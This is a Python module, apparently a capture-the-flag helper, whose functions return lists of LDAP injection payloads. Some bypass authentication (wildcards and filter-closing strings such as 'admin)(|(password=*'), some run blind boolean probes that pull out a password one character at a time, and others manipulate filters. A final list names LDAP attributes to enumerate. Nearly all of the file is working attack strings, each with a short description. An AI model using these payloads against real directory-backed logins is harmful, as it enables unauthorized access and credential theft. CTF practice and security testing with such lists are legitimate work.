"""
LDAP Injection Payload Crafter for Web CTF.
Covers auth bypass, blind LDAP injection, and filter manipulation techniques.
"""

from typing import List, Dict


def get_ldap_auth_bypass_payloads() -> List[Dict[str, str]]:
    """Generate LDAP injection payloads for authentication bypass."""
    return [
        {
            "name": "Always True Filter",
            "payload": "*",
            "desc": "Wildcard matches any entry (auth bypass)."
        },
        {
            "name": "OR Always True (Classic)",
            "payload": "*)(&",
            "desc": "Closes filter and injects always-true condition."
        },
        {
            "name": "OR 1=1 (LDAP)",
            "payload": ")(|(uid=*",
            "desc": "Injects OR condition matching any user."
        },
        {
            "name": "Admin Bypass with Comment",
            "payload": "admin)(|(password=*",
            "desc": "Targets admin user and bypasses password check."
        },
        {
            "name": "Null Byte Termination",
            "payload": "admin\\x00",
            "desc": "Null byte truncates the LDAP filter (legacy)."
        },
        {
            "name": "Wildcard Password",
            "payload": "admin)(&",
            "desc": "Closes admin check and injects wildcard."
        },
        {
            "name": "OR Condition Injection",
            "payload": ")(|(cn=*",
            "desc": "Injects OR condition matching any common name."
        },
        {
            "name": "Double Wildcard",
            "payload": "*)(uid=*",
            "desc": "Matches any user with any uid."
        },
        {
            "name": "Parenthesis Injection",
            "payload": ")(|(mail=*",
            "desc": "Injects OR condition matching any email."
        }
    ]


def get_ldap_blind_payloads() -> List[Dict[str, str]]:
    """Generate blind LDAP injection payloads for boolean-based extraction."""
    return [
        {
            "name": "Boolean True Probe",
            "payload": "admin)(|(password=a)",
            "desc": "Tests if condition evaluates true (valid login)."
        },
        {
            "name": "Boolean False Probe",
            "payload": "admin)(&(password=a)",
            "desc": "Tests if condition evaluates false (invalid login)."
        },
        {
            "name": "Character Extraction (AND)",
            "payload": "admin)(&(password=a*)",
            "desc": "Tests if password starts with 'a' (char-by-char extraction)."
        },
        {
            "name": "Character Extraction (OR)",
            "payload": "admin)(|(password=a*)",
            "desc": "OR-based character extraction."
        },
        {
            "name": "Wildcard Prefix Test",
            "payload": "admin)(&(password=*)",
            "desc": "Tests if password field exists."
        },
        {
            "name": "Attribute Existence Test",
            "payload": "admin)(&(mail=*)",
            "desc": "Tests if mail attribute exists."
        }
    ]


def get_ldap_filter_manipulation() -> List[Dict[str, str]]:
    """Generate LDAP filter manipulation payloads."""
    return [
        {
            "name": "Filter Injection (AND)",
            "payload": "&(uid=admin)(password=*)",
            "desc": "Injects AND condition to require both uid and password."
        },
        {
            "name": "Filter Injection (OR)",
            "payload": "|(uid=admin)(uid=root)",
            "desc": "Injects OR condition to match multiple users."
        },
        {
            "name": "NOT Condition",
            "payload": "!(uid=admin)",
            "desc": "Injects NOT condition to exclude admin."
        },
        {
            "name": "Nested Filter",
            "payload": "(&(uid=admin)(|(password=*)(password=*)))",
            "desc": "Nested filters to bypass simple validation."
        },
        {
            "name": "Wildcard in Attribute",
            "payload": "uid=*",
            "desc": "Wildcard to match any uid."
        },
        {
            "name": "Multiple Wildcards",
            "payload": "uid=*)(|(uid=*",
            "desc": "Multiple wildcards to match all entries."
        }
    ]


def get_ldap_common_attributes() -> List[str]:
    """Common LDAP attributes to enumerate."""
    return [
        "uid", "cn", "sn", "givenName", "mail", "userPassword", "password",
        "memberOf", "description", "telephoneNumber", "title", "department",
        "employeeNumber", "homeDirectory", "loginShell", "uidNumber", "gidNumber"
    ]
